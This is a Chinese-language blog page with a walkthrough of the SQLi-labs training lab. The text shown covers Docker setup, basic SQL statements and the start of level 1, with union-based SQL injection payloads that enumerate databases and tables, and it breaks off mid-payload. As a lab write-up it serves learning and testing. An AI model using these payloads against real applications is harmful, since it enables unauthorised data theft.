<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>Sqli-lab速刷记录(1-53) - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="之前很早写的，这几天把它补齐了。"><meta property="og:type" content="article"><meta property="og:title" content="Sqli-lab速刷记录(1-53)"><meta property="og:url" content="https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="之前很早写的，这几天把它补齐了。"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2019-03-03T22:31:20.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.720Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="Sec"><meta property="article:tag" content="sql注入"><meta name="twitter:card" content="summary"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Preparation">1&nbsp;&nbsp;<b>Preparation</b></a><hr class="navbar-divider"> <a class="navbar-item" href="#Basic">2&nbsp;&nbsp;<b>Basic</b></a><hr class="navbar-divider"> <a class="navbar-item" href="#SQLi-LABS-Page-1-Basic-Challenges">3&nbsp;&nbsp;<b>SQLi-LABS Page-1(Basic Challenges)</b></a> <a class="navbar-item" href="#Less-1">3.1&nbsp;&nbsp;Less-1</a> <a class="navbar-item" href="#Less-2">3.2&nbsp;&nbsp;Less-2</a> <a class="navbar-item" href="#Less-3">3.3&nbsp;&nbsp;Less-3</a> <a class="navbar-item" href="#Less-4">3.4&nbsp;&nbsp;Less-4</a> <a class="navbar-item" href="#Less-5">3.5&nbsp;&nbsp;Less-5</a> <a class="navbar-item" href="#使用left">3.5.1&nbsp;&nbsp;使用left()</a> <a class="navbar-item" href="#使用substr-、ascii">3.5.2&nbsp;&nbsp;使用substr()、ascii()</a> <a class="navbar-item" href="#使用regexp">3.5.3&nbsp;&nbsp;使用regexp()</a> <a class="navbar-item" href="#使用ord-、mid">3.5.4&nbsp;&nbsp;使用ord()、mid()</a> <a class="navbar-item" href="#使用报错注入">3.5.5&nbsp;&nbsp;使用报错注入</a> <a class="navbar-item" href="#使用延时注入">3.5.6&nbsp;&nbsp;使用延时注入</a> <a class="navbar-item" href="#Less-6">3.6&nbsp;&nbsp;Less-6</a> <a class="navbar-item" href="#Less-7">3.7&nbsp;&nbsp;Less-7</a> <a class="navbar-item" href="#Less-8">3.8&nbsp;&nbsp;Less-8</a> <a class="navbar-item" href="#Less-9">3.9&nbsp;&nbsp;Less-9</a> <a class="navbar-item" href="#Less-10">3.10&nbsp;&nbsp;Less-10</a> <a class="navbar-item" href="#Less-11">3.11&nbsp;&nbsp;Less-11</a> <a class="navbar-item" href="#Less-12">3.12&nbsp;&nbsp;Less-12</a> <a class="navbar-item" href="#Less-13">3.13&nbsp;&nbsp;Less-13</a> <a class="navbar-item" href="#Less-14">3.14&nbsp;&nbsp;Less-14</a> <a class="navbar-item" href="#Less-15">3.15&nbsp;&nbsp;Less-15</a> <a class="navbar-item" href="#Less-16">3.16&nbsp;&nbsp;Less-16</a> <a class="navbar-item" href="#Less-17">3.17&nbsp;&nbsp;Less-17</a> <a class="navbar-item" href="#Less-18">3.18&nbsp;&nbsp;Less-18</a> <a class="navbar-item" href="#Less-19">3.19&nbsp;&nbsp;Less-19</a> <a class="navbar-item" href="#Less-20">3.20&nbsp;&nbsp;Less-20</a> <a class="navbar-item" href="#Less-21">3.21&nbsp;&nbsp;Less-21</a> <a class="navbar-item" href="#Less-22">3.22&nbsp;&nbsp;Less-22</a> <a class="navbar-item" href="#Less-23">3.23&nbsp;&nbsp;Less-23</a> <a class="navbar-item" href="#Less-24">3.24&nbsp;&nbsp;Less-24</a> <a class="navbar-item" href="#Less-25">3.25&nbsp;&nbsp;Less-25</a> <a class="navbar-item" href="#Less-25a">3.26&nbsp;&nbsp;Less-25a</a> <a class="navbar-item" href="#Less-26">3.27&nbsp;&nbsp;Less-26</a> <a class="navbar-item" href="#Less-26a">3.28&nbsp;&nbsp;Less-26a</a> <a class="navbar-item" href="#Less-27">3.29&nbsp;&nbsp;Less-27</a> <a class="navbar-item" href="#Less-27a">3.30&nbsp;&nbsp;Less-27a</a> <a class="navbar-item" href="#Less-28">3.31&nbsp;&nbsp;Less-28</a> <a class="navbar-item" href="#Less-28a">3.32&nbsp;&nbsp;Less-28a</a> <a class="navbar-item" href="#Less-29">3.33&nbsp;&nbsp;Less-29</a> <a class="navbar-item" href="#Less-30">3.34&nbsp;&nbsp;Less-30</a> <a class="navbar-item" href="#Less-31">3.35&nbsp;&nbsp;Less-31</a> <a class="navbar-item" href="#Less-32">3.36&nbsp;&nbsp;Less-32</a> <a class="navbar-item" href="#Less-33">3.37&nbsp;&nbsp;Less-33</a> <a class="navbar-item" href="#Less-34">3.38&nbsp;&nbsp;Less-34</a> <a class="navbar-item" href="#Less-35">3.39&nbsp;&nbsp;Less-35</a> <a class="navbar-item" href="#Less-36">3.40&nbsp;&nbsp;Less-36</a> <a class="navbar-item" href="#Less-37">3.41&nbsp;&nbsp;Less-37</a> <a class="navbar-item" href="#Less-38">3.42&nbsp;&nbsp;Less-38</a> <a class="navbar-item" href="#Less-39">3.43&nbsp;&nbsp;Less-39</a> <a class="navbar-item" href="#Less-40">3.44&nbsp;&nbsp;Less-40</a> <a class="navbar-item" href="#Less-41">3.45&nbsp;&nbsp;Less-41</a> <a class="navbar-item" href="#Less-42">3.46&nbsp;&nbsp;Less-42</a> <a class="navbar-item" href="#Less-43">3.47&nbsp;&nbsp;Less-43</a> <a class="navbar-item" href="#Less-44">3.48&nbsp;&nbsp;Less-44</a> <a class="navbar-item" href="#Less-45">3.49&nbsp;&nbsp;Less-45</a> <a class="navbar-item" href="#Less-46">3.50&nbsp;&nbsp;Less-46</a> <a class="navbar-item" href="#Less-47">3.51&nbsp;&nbsp;Less-47</a> <a class="navbar-item" href="#Less-48">3.52&nbsp;&nbsp;Less-48</a> <a class="navbar-item" href="#Less-49">3.53&nbsp;&nbsp;Less-49</a> <a class="navbar-item" href="#Less-50">3.54&nbsp;&nbsp;Less-50</a> <a class="navbar-item" href="#Less-51">3.55&nbsp;&nbsp;Less-51</a> <a class="navbar-item" href="#Less-52">3.56&nbsp;&nbsp;Less-52</a> <a class="navbar-item" href="#Less-53">3.57&nbsp;&nbsp;Less-53</a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> Sqli-lab速刷记录(1-53)</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Mar 3 2019</span> <span class="second-date-block">(<time datetime="2019-03-03T22:31:20.000Z" itemprop="datePublished">Mar 3 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/Sec/">Sec</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">22 minutes read (About 3263 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Preparation"><span class="post-toc-number">1.</span> <span class="post-toc-text">Preparation</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Basic"><span class="post-toc-number">2.</span> <span class="post-toc-text">Basic</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQLi-LABS-Page-1-Basic-Challenges"><span class="post-toc-number">3.</span> <span class="post-toc-text">SQLi-LABS Page-1(Basic Challenges)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">Less-1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-2"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">Less-2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-3"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Less-3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-4"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">Less-4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-5"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">Less-5</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用left"><span class="post-toc-number">3.5.1.</span> <span class="post-toc-text">使用left()</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用substr-、ascii"><span class="post-toc-number">3.5.2.</span> <span class="post-toc-text">使用substr()、ascii()</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用regexp"><span class="post-toc-number">3.5.3.</span> <span class="post-toc-text">使用regexp()</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用ord-、mid"><span class="post-toc-number">3.5.4.</span> <span class="post-toc-text">使用ord()、mid()</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用报错注入"><span class="post-toc-number">3.5.5.</span> <span class="post-toc-text">使用报错注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用延时注入"><span class="post-toc-number">3.5.6.</span> <span class="post-toc-text">使用延时注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-6"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">Less-6</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-7"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">Less-7</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-8"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">Less-8</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-9"><span class="post-toc-number">3.9.</span> <span class="post-toc-text">Less-9</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-10"><span class="post-toc-number">3.10.</span> <span class="post-toc-text">Less-10</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-11"><span class="post-toc-number">3.11.</span> <span class="post-toc-text">Less-11</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-12"><span class="post-toc-number">3.12.</span> <span class="post-toc-text">Less-12</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-13"><span class="post-toc-number">3.13.</span> <span class="post-toc-text">Less-13</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-14"><span class="post-toc-number">3.14.</span> <span class="post-toc-text">Less-14</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-15"><span class="post-toc-number">3.15.</span> <span class="post-toc-text">Less-15</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-16"><span class="post-toc-number">3.16.</span> <span class="post-toc-text">Less-16</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-17"><span class="post-toc-number">3.17.</span> <span class="post-toc-text">Less-17</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-18"><span class="post-toc-number">3.18.</span> <span class="post-toc-text">Less-18</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-19"><span class="post-toc-number">3.19.</span> <span class="post-toc-text">Less-19</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-20"><span class="post-toc-number">3.20.</span> <span class="post-toc-text">Less-20</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-21"><span class="post-toc-number">3.21.</span> <span class="post-toc-text">Less-21</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-22"><span class="post-toc-number">3.22.</span> <span class="post-toc-text">Less-22</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-23"><span class="post-toc-number">3.23.</span> <span class="post-toc-text">Less-23</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-24"><span class="post-toc-number">3.24.</span> <span class="post-toc-text">Less-24</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-25"><span class="post-toc-number">3.25.</span> <span class="post-toc-text">Less-25</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-25a"><span class="post-toc-number">3.26.</span> <span class="post-toc-text">Less-25a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-26"><span class="post-toc-number">3.27.</span> <span class="post-toc-text">Less-26</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-26a"><span class="post-toc-number">3.28.</span> <span class="post-toc-text">Less-26a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-27"><span class="post-toc-number">3.29.</span> <span class="post-toc-text">Less-27</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-27a"><span class="post-toc-number">3.30.</span> <span class="post-toc-text">Less-27a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-28"><span class="post-toc-number">3.31.</span> <span class="post-toc-text">Less-28</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-28a"><span class="post-toc-number">3.32.</span> <span class="post-toc-text">Less-28a</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-29"><span class="post-toc-number">3.33.</span> <span class="post-toc-text">Less-29</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-30"><span class="post-toc-number">3.34.</span> <span class="post-toc-text">Less-30</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-31"><span class="post-toc-number">3.35.</span> <span class="post-toc-text">Less-31</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-32"><span class="post-toc-number">3.36.</span> <span class="post-toc-text">Less-32</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-33"><span class="post-toc-number">3.37.</span> <span class="post-toc-text">Less-33</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-34"><span class="post-toc-number">3.38.</span> <span class="post-toc-text">Less-34</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-35"><span class="post-toc-number">3.39.</span> <span class="post-toc-text">Less-35</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-36"><span class="post-toc-number">3.40.</span> <span class="post-toc-text">Less-36</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-37"><span class="post-toc-number">3.41.</span> <span class="post-toc-text">Less-37</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-38"><span class="post-toc-number">3.42.</span> <span class="post-toc-text">Less-38</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-39"><span class="post-toc-number">3.43.</span> <span class="post-toc-text">Less-39</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-40"><span class="post-toc-number">3.44.</span> <span class="post-toc-text">Less-40</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-41"><span class="post-toc-number">3.45.</span> <span class="post-toc-text">Less-41</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-42"><span class="post-toc-number">3.46.</span> <span class="post-toc-text">Less-42</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-43"><span class="post-toc-number">3.47.</span> <span class="post-toc-text">Less-43</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-44"><span class="post-toc-number">3.48.</span> <span class="post-toc-text">Less-44</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-45"><span class="post-toc-number">3.49.</span> <span class="post-toc-text">Less-45</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-46"><span class="post-toc-number">3.50.</span> <span class="post-toc-text">Less-46</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-47"><span class="post-toc-number">3.51.</span> <span class="post-toc-text">Less-47</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-48"><span class="post-toc-number">3.52.</span> <span class="post-toc-text">Less-48</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-49"><span class="post-toc-number">3.53.</span> <span class="post-toc-text">Less-49</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-50"><span class="post-toc-number">3.54.</span> <span class="post-toc-text">Less-50</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-51"><span class="post-toc-number">3.55.</span> <span class="post-toc-text">Less-51</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-52"><span class="post-toc-number">3.56.</span> <span class="post-toc-text">Less-52</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-53"><span class="post-toc-number">3.57.</span> <span class="post-toc-text">Less-53</span></a></li></ol></li></ol><html><head></head><body><p>之前很早写的，这几天把它补齐了。</p><a id="more"></a><p>[TOC]</p><h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>为了不干扰自己本机环境，sql-lab我就用的docker跑起来的，搭建也非常简单，也就两条命令<br></p><figure class="highlight arduino hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull acgpiano/sqli-<span class="hljs-built_in">labs</span></span><br><span class="line"></span><br><span class="line">docker <span class="hljs-built_in">run</span> -dt --name sqli-lab -p [你要映射的端口]:<span class="hljs-number">80</span> acgpiano/sqli-<span class="hljs-built_in">labs</span>:latest</span><br></pre></td></tr></tbody></table></figure><br>然后在sql-lab上直接初始化数据库就好了。<p></p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>这里列举一下sql基础语句<br></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;         //查看数据库</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">use</span> xxx;                //使用某个数据库</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;            //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line">desc xxx;               //查看该数据表的结构</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> xxx;      //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata;        //猜数据库</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'xxxxx'</span>;                                //猜某数据库的数据表</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">Select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'xxxxx'</span>;                                //猜某表的所有列</span><br><span class="line"></span><br><span class="line">left(a,b)       //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="hljs-keyword">start</span>[,<span class="hljs-keyword">length</span>])     //从位置<span class="hljs-keyword">start</span>开始，截取column_name字符串的<span class="hljs-keyword">length</span>位，与<span class="hljs-keyword">substr</span>作用相同</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">substr</span>(<span class="hljs-keyword">string</span>, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">length</span>)       //从位置<span class="hljs-keyword">start</span>开始，截取字符串<span class="hljs-keyword">string</span>的<span class="hljs-keyword">length</span>长度，与<span class="hljs-keyword">mid</span>作用相同</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">ascii</span>()         //将某个字符转换成<span class="hljs-keyword">ascii</span>码</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">ord</span>()           //将某个字符转换成<span class="hljs-keyword">ascii</span>码，同<span class="hljs-keyword">ascii</span>()</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1(Basic Challenges)"></a>SQLi-LABS Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>尝试添加’注入，发现报错<br></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="hljs-builtin-name">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the<span class="hljs-built_in"> manual </span>that corresponds <span class="hljs-keyword">to</span> your MySQL<span class="hljs-built_in"> server </span>version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">''</span>1<span class="hljs-string">''</span> LIMIT 0,1<span class="hljs-string">' at line 1</span></span><br></pre></td></tr></tbody></table></figure><br>这里我们就可以直接发现报错的地方，直接将后面注释，然后使用<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3%23    //得到列数为3</span><br><span class="line"></span><br><span class="line">//这里用-1是为了查询一个不存在的id,好让第一句结果为空，直接显示第二句的结果</span><br><span class="line">-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%<span class="hljs-number">23</span>  //得到数据库名</span><br><span class="line"></span><br><span class="line"><span class="hljs-number">-1</span><span class="hljs-string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= '</span><span class="hljs-keyword">security</span><span class="hljs-string">'#    //得到表名</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">-1'</span> <span class="hljs-keyword">union</span> <span 